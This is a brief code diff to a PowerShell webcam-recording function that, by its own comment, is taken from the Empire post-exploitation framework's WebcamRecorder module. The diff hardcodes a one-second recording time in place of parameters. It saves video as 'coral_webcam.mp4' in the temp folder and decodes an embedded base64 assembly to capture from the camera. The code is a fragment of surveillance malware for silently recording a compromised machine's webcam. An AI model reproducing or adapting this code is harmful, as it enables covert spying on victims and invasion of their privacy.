@@ -1,10 +1,6 @@
 # Taken from : https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/collection/WebcamRecorder.py
 #WEBCAM
 function Mwebcam {
-    param(
-        [int]$durationSeconds = 1,
-        [string]$quality = "low"
-    )
     #http://www.codeproject.com/Articles/3566/DirectX-Capture-Class-Library
     #http://directshownet.sourceforge.net/
     #Merged the DirectX and DShowNET assemblies
@@ -14,7 +10,7 @@ function Mwebcam {
     $tempDir = $env:TEMP
     $fileName = "coral_webcam.mp4"
     $OutPath = Join-Path $tempDir $fileName  
-    $RecordTime = $durationSeconds
+    $RecordTime = 1
     
     $bytes = [Convert]::FromBase64String($encMergedAssembly)
     try {
